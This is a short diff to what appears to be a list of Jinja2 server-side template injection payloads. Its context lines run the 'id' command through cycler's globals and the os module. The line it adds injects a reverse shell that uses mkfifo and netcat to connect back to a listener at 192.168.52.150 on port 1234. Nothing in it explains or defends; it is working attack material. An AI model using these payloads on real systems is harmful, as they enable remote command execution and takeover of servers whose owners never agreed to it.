@@ -10,3 +10,5 @@
 {{ cycler._init_.__globals__.os.popen('id').read() }}
 
 {{ cycler.__init__.__globals__.os.popen('id').read() }}
+
+{{ cycler.__init__.__globals__['os'].popen("rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.52.150 1234 >/tmp/f").read() }}
